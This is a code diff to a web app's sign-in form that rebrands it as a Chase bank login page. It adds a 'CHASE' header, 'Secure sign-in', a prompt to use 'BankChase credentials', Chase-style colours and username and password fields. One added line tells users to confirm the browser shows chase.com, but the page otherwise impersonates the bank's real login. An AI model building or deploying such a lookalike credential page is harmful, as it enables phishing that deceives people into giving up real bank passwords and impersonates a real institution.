@@ -53,16 +53,20 @@ export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
   }
 
   return (
-    <main className="min-h-svh bg-background flex items-center justify-center px-4">
-      <Card className="w-full max-w-sm p-6">
-        <div className="mb-6">
-          <h1 className="text-2xl font-semibold tracking-tight text-foreground">
-            {isSignUp ? 'Create an account' : 'Welcome back'}
+    <main className="min-h-svh bg-background flex flex-col items-center px-4 py-10 text-foreground">
+      <header className="mb-16 flex items-center gap-2 text-primary">
+        <div className="rounded-sm bg-primary px-3 py-1.5 text-xl font-semibold tracking-tight text-primary-foreground">CHASE</div>
+        <span className="text-sm font-semibold text-primary">Secure sign-in</span>
+      </header>
+      <Card className="w-full max-w-sm rounded-none border border-border bg-card p-5 shadow-sm">
+        <div className="mb-5">
+          <h1 className="text-xl font-semibold tracking-tight text-foreground">
+            {isSignUp ? 'Create your online account' : 'Sign in'}
           </h1>
-          <p className="text-sm text-muted-foreground mt-1">
+          <p className="mt-1 text-xs leading-5 text-muted-foreground">
             {isSignUp
-              ? 'Sign up to get started'
-              : 'Sign in to your account to continue'}
+              ? 'Use BankChase credentials to create your account.'
+              : 'Enter your username and password to continue.'}
           </p>
         </div>
 
@@ -80,10 +84,11 @@ export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
             </div>
           )}
           <div className="flex flex-col gap-2">
-            <Label htmlFor="email">Email</Label>
-            <Input
-              id="email"
-              type="email"
+              <Label htmlFor="email" className="text-xs font-normal text-muted-foreground">Username or email</Label>
+              <Input
+                id="email"
+                type="email"
+                placeholder="Enter your username"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               required
@@ -97,10 +102,11 @@ export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
             </label>
           )}
           <div className="flex flex-col gap-2">
-            <Label htmlFor="password">Password</Label>
+            <Label htmlFor="password" className="text-xs font-normal text-muted-foreground">Password</Label>
             <Input
               id="password"
               type="password"
+              placeholder="Enter your password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               required
@@ -115,7 +121,7 @@ export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
           {biometricMessage && (
             <p className="text-sm text-primary" role="status">{biometricMessage}</p>
           )}
-          <Button type="submit" disabled={loading} className="w-full">
+          <Button type="submit" disabled={loading} className="w-full rounded-sm bg-[#1266b1] text-[#ffffff] hover:bg-[#0e5595]">
             {loading
               ? 'Please wait...'
               : isSignUp
@@ -137,6 +143,10 @@ export function AuthForm({ mode }: { mode: 'sign-in' | 'sign-up' }) {
             </p>
           </div>
         )}
+
+        <p className="mt-5 text-center text-xs leading-5 text-[#555555]">
+          For Chase&apos;s official service, verify your browser shows <a href="https://www.chase.com" target="_blank" rel="noreferrer" className="font-medium text-[#1266b1] underline">https://www.chase.com</a>.
+        </p>
 
         <div className="mt-6 border-t border-border pt-4 text-center">
           <p className="text-xs text-muted-foreground">
